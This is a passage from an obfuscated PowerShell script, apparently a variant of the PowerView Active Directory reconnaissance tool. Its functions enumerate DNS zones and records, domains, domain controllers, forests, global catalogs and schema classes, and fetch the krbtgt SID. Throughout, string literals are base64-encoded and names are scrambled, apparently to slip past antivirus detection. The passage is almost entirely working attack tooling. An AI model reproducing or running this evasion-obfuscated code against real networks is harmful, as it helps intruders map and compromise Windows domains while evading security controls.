        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/\/==\_/=\/\/\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
        if (${_/\/\/==\_/=\/\/\}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_/\/\/==\_/=\/\/\}.FindOne()  }
            else { ${_/\__/\/=====\_/\} = ${_/\/\/==\_/=\/\/\}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                ${/==\/===\__/\___/} = _______/==\_/=\_/= -Properties $_.Properties
                ${/==\/===\__/\___/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${/==\/===\__/\___/}.name
                ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                ${/==\/===\__/\___/}
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQARgBTAFMAaABhAHIAZQBdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                }
            }
            ${_/\/\/==\_/=\/\/\}.dispose()
        }
        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0ATQBpAGMAcgBvAHMAbwBmAHQARABOAFMALABEAEMAPQBEAG8AbQBhAGkAbgBEAG4AcwBaAG8AbgBlAHMA')))
        ${_/\_/=\__/\/=\__/} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
        if (${_/\_/=\__/\/=\__/}) {
            try {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_/\_/=\__/\/=\__/}.FindOne() }
                else { ${_/\__/\/=====\_/\} = ${_/\_/=\__/\/=\__/}.FindAll() }
                ${_/\__/\/=====\_/\} | ? {$_} | % {
                    ${/==\/===\__/\___/} = _______/==\_/=\_/= -Properties $_.Properties
                    ${/==\/===\__/\___/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) ${/==\/===\__/\___/}.name
                    ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBaAG8AbgBlAA=='))))
                    ${/==\/===\__/\___/}
                }
                if (${_/\__/\/=====\_/\}) {
                    try { ${_/\__/\/=====\_/\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                    }
                }
            }
            catch {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFoAbwBuAGUAXQAgAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAJwBDAE4APQBNAGkAYwByAG8AcwBvAGYAdABEAE4AUwAsAEQAQwA9AEQAbwBtAGEAaQBuAEQAbgBzAFoAbwBuAGUAcwAnAA==')))
            }
            ${_/\_/=\__/\/=\__/}.dispose()
        }
    }
}
function Get-DomainDNSRecord {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\/\/\/\___/\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBOAG8AZABlACkA')))
            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/==\/==\_/====} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
        if (${___/==\/==\_/====}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${___/==\/==\_/====}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${___/==\/==\_/====}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                try {
                    ${/==\/===\__/\___/} = _______/==\_/=\_/= -Properties $_.Properties | select name,distinguishedname,dnsrecord,whencreated,whenchanged
                    ${/==\/===\__/\___/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WgBvAG4AZQBOAGEAbQBlAA=='))) $ZoneName
                    if (${/==\/===\__/\___/}.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        ${________/\_/=\__/} = _____/\_____/=\/== -DNSRecord ${/==\/===\__/\___/}.dnsrecord[0]
                    }
                    else {
                        ${________/\_/=\__/} = _____/\_____/=\/== -DNSRecord ${/==\/===\__/\___/}.dnsrecord
                    }
                    if (${________/\_/=\__/}) {
                        ${________/\_/=\__/}.PSObject.Properties | % {
                            ${/==\/===\__/\___/} | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAE4AUwBSAGUAYwBvAHIAZAA='))))
                    ${/==\/===\__/\___/}
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                    ${/==\/===\__/\___/}
                }
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEQATgBTAFIAZQBjAG8AcgBkAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${___/==\/==\_/====}.dispose()
        }
    }
}
function __/\/\__/=\/\/\/\/ {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBEAG8AbQBhAGkAbgA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAFQAYQByAGcAZQB0AEQAbwBtAGEAaQBuACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${/=\__/\/\/==\/=\/} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${/=\__/\/\/==\/=\/})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVABhAHIAZwBlAHQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACwAIABvAHIAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIABpAG4AdgBhAGwAaQBkADoAIAAkAF8A')))
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${/=\__/\/\/==\/=\/} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(${/=\__/\/\/==\/=\/})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACAAOgAgACQAXwA=')))
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQB2AGkAbgBnACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgACQAXwA=')))
            }
        }
    }
}
function _/=\/==\_/\_/\/\/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Switch]
        ${___/\/=\_/\/=\/\/=},
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\_/=\_/===\____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
            __/\/\/=\/\_/==\/\ @_/\_/=\_/===\____
        }
        else {
            ${/=\/=\/\/=\/=\__/} = __/\/\__/=\/\/\/\/ @_/\_/=\_/===\____
            if (${/=\/=\/\/=\/=\__/}) {
                ${/=\/=\/\/=\/=\__/}.DomainControllers
            }
        }
    }
}
function ___________/=\/\__ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG8AcgBlAHMAdAA=')))
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
                ${/==\___/\/=\/=\__} = $Forest
            }
            else {
                ${/==\___/\/=\/=\__} = $Credential.GetNetworkCredential().Domain
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAEYAbwByAGUAcwB0ACcAIABmAHIAbwBtACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsAA==')))
            }
            ${____/\__/=\/\/\__} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), ${/==\___/\/=\/=\__}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            try {
                ${/==\/====\__/\/\/} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${____/\__/=\/\/\__})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQAewAvAD0APQBcAF8AXwBfAC8AXAAvAD0AXAAvAD0AXABfAF8AfQAnACAAZABvAGUAcwAgAG4AbwB0ACAAZQB4AGkAcwB0ACwAIABjAG8AdQBsAGQAIABuAG8AdAAgAGIAZQAgAGMAbwBuAHQAYQBjAHQAZQBkACwAIAB0AGgAZQByAGUAIABpAHMAbgAnAHQAIABhAG4AIABlAHgAaQBzAHQAaQBuAGcAIAB0AHIAdQBzAHQALAAgAG8AcgAgAHQAaABlACAAcwBwAGUAYwBpAGYAaQBlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABhAHIAZQAgAGkAbgB2AGEAbABpAGQAOgAgACQAXwA=')))
                $Null
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) {
            ${____/\__/=\/\/\__} = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                ${/==\/====\__/\/\/} = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(${____/\__/=\/\/\__})
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAZgBvAHIAZQBzAHQAIAAnACQARgBvAHIAZQBzAHQAJwAgAGQAbwBlAHMAIABuAG8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8AbgB0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuACAAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ADoAIAAkAF8A')))
                return $Null
            }
        }
        else {
            ${/==\/====\__/\/\/} = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if (${/==\/====\__/\/\/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${________/=======\} = (____/\/====\/\___/ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${/==\/====\__/\/\/}.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                ${________/=======\} = (____/\/====\/\___/ -Identity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain ${/==\/====\__/\/\/}.RootDomain.Name).objectsid
            }
            ${_/=\/\/\__/=\/===} = ${________/=======\} -Split '-'
            ${________/=======\} = ${_/=\/\/\__/=\/===}[0..$(${_/=\/\/\__/=\/===}.length-2)] -join '-'
            ${/==\/====\__/\/\/} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) ${________/=======\}
            ${/==\/====\__/\/\/}
        }
    }
}
function Get-ForestDomain {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\_/=\_/===\____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\/====\__/\/\/} = ___________/=\/\__ @_/\_/=\_/===\____
        if (${/==\/====\__/\/\/}) {
            ${/==\/====\__/\/\/}.Domains
        }
    }
}
function Get-ForestGlobalCatalog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\_/=\_/===\____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\/====\__/\/\/} = ___________/=\/\__ @_/\_/=\_/===\____
        if (${/==\/====\__/\/\/}) {
            ${/==\/====\__/\/\/}.FindAllGlobalCatalogs()
        }
    }
}
function Get-ForestSchemaClass {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\_/=\_/===\____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/=\_/===\____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\/====\__/\/\/} = ___________/=\/\__ @_/\_/=\_/===\____
        if (${/==\/====\__/\/\/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
                ForEach (${_/\/=\/===\_/\__/} in $ClassName) {
                    ${/==\/====\__/\/\/}.Schema.FindClass(${_/\/=\/===\_/\__/})
                }
            }
            else {
                ${/==\/====\__/\/\/}.Schema.FindAllClasses()
            }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
